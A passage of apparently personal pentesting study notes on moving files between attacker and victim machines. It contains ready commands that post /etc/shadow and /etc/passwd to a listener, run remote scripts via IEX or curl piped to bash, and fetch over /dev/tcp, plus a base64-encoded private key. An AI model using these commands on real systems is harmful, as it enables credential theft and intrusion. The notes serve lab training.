<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 -m pyftpdlib --port 21</span><br></span></code></pre></div></div>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; (New-Object Net.WebClient).DownloadFile(&#x27;ftp://192.168.49.128/file.txt&#x27;, &#x27;C:\Users\Public\ftp-file.txt&#x27;)</span><br></span></code></pre></div></div>
<p>Or create a command file to download the file:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Let&#x27;s execute the command</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; ftp -v -n -s:ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Let&#x27;s verify</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">more file.txt</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="powershell-web-uploads">PowerShell Web Uploads<a href="#powershell-web-uploads" class="hash-link" aria-label="Direct link to PowerShell Web Uploads" title="Direct link to PowerShell Web Uploads">​</a></h3>
<p>Most of the webserver need to be configured to accept uploads. To make thing easier, it exists the python <code>uploadserver</code> module, which is an extension of the <code>http.server</code> module:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m uploadserver</span><br></span></code></pre></div></div>
<p>Now, we can use a PS script to do the upload. First we download and execcute the setup script. Later, we execute the <code>Invoke-FileUpload</code>.</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; IEX(New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts</span><br></span></code></pre></div></div>
<p>Another option is to have <code>nc</code> listening and use <code>Invoke-WebRequest</code> in the Windows machine.</p>
<p>Attacker:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc -lvnp 8000</span><br></span></code></pre></div></div>
<p>Victim:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path &#x27;C:\Windows\System32\drivers\etc\hosts&#x27; -Encoding Byte))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="smb-uploads">SMB Uploads<a href="#smb-uploads" class="hash-link" aria-label="Direct link to SMB Uploads" title="Direct link to SMB Uploads">​</a></h3>
<p>Most firewall might block the SMB port. An alternative SMB can be run over HTTP using <code>WebDAV</code>. When you use SMB, it will first attempt to connect using the SMB protocol, and if there&#x27;s no SMB share available, it will try to connect using HTTP.</p>
<p>In the attacker machine, we can run a WebDAV server:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous </span><br></span></code></pre></div></div>
<p>In the Windows machine, we can use the server as it was SMB:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dir \\192.168.49.128\DavWWWRoot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\</span><br></span></code></pre></div></div>
<p><code>DavWWWRoot</code> is a special keyword recognized by the Windows Shell. You can use an existing folder if you want to avoid this keyword.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ftp-uploads">FTP Uploads<a href="#ftp-uploads" class="hash-link" aria-label="Direct link to FTP Uploads" title="Direct link to FTP Uploads">​</a></h3>
<p>Let&#x27;s run ftp server in the attacker machine:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 -m pyftpdlib --port 21 --write</span><br></span></code></pre></div></div>
<p>And now execute the upload:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\htb&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://192.168.49.128/ftp-hosts&#x27;, &#x27;C:\Windows\System32\drivers\etc\hosts&#x27;)</span><br></span></code></pre></div></div>
<p>or create and execute a command:</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Now execute the command</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\htb&gt; ftp -v -n -s:ftpcommand.txt</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux">Linux<a href="#linux" class="hash-link" aria-label="Direct link to Linux" title="Direct link to Linux">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="base64-1">Base64<a href="#base64-1" class="hash-link" aria-label="Direct link to Base64" title="Direct link to Base64">​</a></h3>
<p>The same encoding/decoding mechanism can be used to transfer files in Linux.</p>
<ol>
<li>Verify the encode base64</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">md5sum id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat id_rsa |base64 -w 0;echo</span><br></span></code></pre></div></div>
<ol start="2">
<li>Copy the base64, decode and verify the hash</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ echo -n &#x27;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&#x27; | base64 -d &gt; id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">md5sum id_rsa</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="curlwget">curl/wget<a href="#curlwget" class="hash-link" aria-label="Direct link to curl/wget" title="Direct link to curl/wget">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="fileless-operations">Fileless operations<a href="#fileless-operations" class="hash-link" aria-label="Direct link to Fileless operations" title="Direct link to Fileless operations">​</a></h3>
<p>Thanks to the Linux pipes, we can execute a file without the need to download it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash</span><br></span></code></pre></div></div>
<p>The same can be done with <code>wget</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="download-with-bash">Download with Bash<a href="#download-with-bash" class="hash-link" aria-label="Direct link to Download with Bash" title="Direct link to Download with Bash">​</a></h3>
<p>Sometimes <code>curl</code> nor <code>wget</code> are available, in this case the built-in <code>/dev/tcp</code> bash device can be used.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Connect to the server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exec 3&lt;&gt;/dev/tcp/10.10.10.32/80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Perform the GET request</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo -e &quot;GET /LinEnum.sh HTTP/1.1\n\n&quot;&gt;&amp;3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Print the response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat &lt;&amp;3</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ssh">SSH<a href="#ssh" class="hash-link" aria-label="Direct link to SSH" title="Direct link to SSH">​</a></h3>
<p>Make sure there&#x27;s a SSH server running on the other side. Then use <code>scp</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">scp plaintext@192.168.49.128:/root/myroot.txt . </span><br></span></code></pre></div></div>
<p>scp can be used as well to upload files:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web-upload">Web upload<a href="#web-upload" class="hash-link" aria-label="Direct link to Web upload" title="Direct link to Web upload">​</a></h3>
<p>We can use <code>uploadserver</code> in the same way as mentioned before in the Windows section. We can configure <code>uploadserver</code> to work under HTTPS.</p>
<p>Create a self-signed certificate and start the server using the certificate.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj &#x27;/CN=server&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 -m uploadserver 443 --server-certificate ~/server.pem</span><br></span></code></pre></div></div>
<p>Now in the victim machine, we just need to pass the <code>--insecure</code> flag:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl -X POST https://192.168.49.128/upload -F &#x27;files=@/etc/passwd&#x27; -F &#x27;files=@/etc/shadow&#x27; --insecure</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="multiple-web-servers">Multiple web servers<a href="#multiple-web-servers" class="hash-link" aria-label="Direct link to Multiple web servers" title="Direct link to Multiple web servers">​</a></h3>
<p>There are many ways to start a web server in multiple programming languages:</p>
<ul>
<li>Python3: <code>python3 -m http.server</code></li>
<li>Python2: <code>python2.7 -m SimpleHTTPServer</code></li>
<li>PHP: <code>php -S 0.0.0.0:8000</code></li>
<li>Ruby: <code>ruby -run -ehttpd . -p8000</code></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="transfer-files-with-code">Transfer files with code<a href="#transfer-files-with-code" class="hash-link" aria-label="Direct link to Transfer files with code" title="Direct link to Transfer files with code">​</a></h2>
<p>So far, we have seen ways of moving files using existing tools. However, we can leverage the use of programming languges to transfer data as well.</p>
<ul>
<li>Python 2.7:</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python2.7 -c &#x27;import urllib;urllib.urlretrieve (&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#x27;</span><br></span></code></pre></div></div>
<ul>
<li>Python3:</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &#x27;import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#x27;</span><br></span></code></pre></div></div>
<ul>
<li>PHP:</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php -r &#x27;$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#x27;</span><br></span></code></pre></div></div>
<p>Using fopen:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php -r &#x27;const BUFFER = 1024; $fremote = </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);&#x27;</span><br></span></code></pre></div></div>
<p>Download the file and execute it directly</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php -r &#x27;$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) { echo $line; }&#x27; | bash</span><br></span></code></pre></div></div>
<ul>
<li>Ruby:</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ruby -e &#x27;require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))&#x27;</span><br></span></code></pre></div></div>
<ul>
<li>Perl:</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ perl -e &#x27;use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);&#x27;</span><br></span></code></pre></div></div>
<ul>
<li>Javascript (for Windows):</li>
</ul>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> </span><span class="token maybe-class-name">WinHttpReq</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">ActiveXObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;WinHttp.WinHttpRequest.5.1&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">WinHttpReq</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access maybe-class-name" style="color:#d73a49">Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;GET&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token maybe-class-name">WScript</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access maybe-class-name" style="color:#d73a49">Arguments</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/*async=*/</span><span class="token boolean" style="color:#36acaa">false</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">WinHttpReq</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access maybe-class-name" style="color:#d73a49">Send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">BinStream</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">ActiveXObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;ADODB.Stream&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">BinStream</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access maybe-class-name">Type</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">BinStream</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access maybe-class-name" style="color:#d73a49">Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">BinStream</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access maybe-class-name" style="color:#d73a49">Write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token maybe-class-name">WinHttpReq</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access maybe-class-name">ResponseBody</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">BinStream</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access maybe-class-name" style="color:#d73a49">SaveToFile</span><span class="token punctuation" style="color:#393A34">(</span><span class="token maybe-class-name">WScript</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access maybe-class-name" style="color:#d73a49">Arguments</span><span class="token punctuation" 